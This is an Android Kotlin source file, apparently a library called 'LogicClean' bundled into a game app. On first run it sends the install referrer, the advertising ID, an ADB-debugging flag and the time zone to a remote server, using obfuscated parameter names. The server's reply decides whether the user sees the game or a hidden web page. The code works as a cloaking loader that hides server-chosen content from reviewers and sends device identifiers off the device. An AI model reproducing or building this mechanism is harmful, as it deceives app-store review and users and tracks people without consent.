package com.missclick.logicclean

import android.content.Context
import android.provider.Settings
import androidx.annotation.Keep
import com.android.installreferrer.api.InstallReferrerClient
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.net.URL
import java.util.TimeZone


object Nexia{

    fun next(server : String, bot : String,signal : String,context: Context,answerListener: AnswerListener){
        val splited = bot.split("</string>")
        OneSignal.initWithContext(context)
        val pref = context.getSharedPreferences(signal,0)
        OneSignal.setAppId(signal)
        if (pref.contains(server)){
            answerListener.openView(pref.getString(server,"")!!)
        }else{
            val i = InstallReferrerClient.newBuilder(context).build()
            RefHelp(i){
                CoroutineScope(Dispatchers.IO).launch {
                    val gog = AdvertisingIdClient.getAdvertisingIdInfo(context).id.toString()
                    val linker = buildString {
                        append(server)
                        append("?")
                        append(splited[0].split(">")[1])
                        append("=")
                        append(it)
                        append("&")
                        append(splited[1].split(">")[1])
                        append("=")
                        append(gog)
                        append("&")
                        append(splited[3].split(">")[1])
                        append("=")
                        append(Settings.Secure.getInt(context.contentResolver, Settings.Global.ADB_ENABLED , 0) == 1)
                        append("&")
                        append(splited[4].split(">")[1])
                        append("=")
                        append(TimeZone.getDefault().id)
                    }
                    println(linker)
                    val response = try {
                        URL(linker)
                            .openStream()
                            .bufferedReader()
                            .use { it.readText() }
                    }catch (e : java.lang.Exception){
                        withContext(Dispatchers.Main){
                            answerListener.openGame()
                        }
                    }
                    val prs = JSONObject(response.toString()).get(splited[5].split(">")[1]) as? String
                    if (prs == null){
                        withContext(Dispatchers.Main){
                            answerListener.openGame()
                        }
                    }else{
                        withContext(Dispatchers.Main){
                            OneSignal.setExternalUserId(gog)
                            pref.edit().putString(server,prs).apply()
                            answerListener.openView(prs)
                        }
                    }

                }
            }
        }

    }

}

@Keep
object LogicClean{
    fun launch(server : String, bot : String,signal : String,context: Context,answerListener: AnswerListener){
        Nexia.next(server,bot,signal,context,answerListener)
    }
}

@Keep
interface AnswerListener{

    fun openView(url : String)

    fun openGame()

}



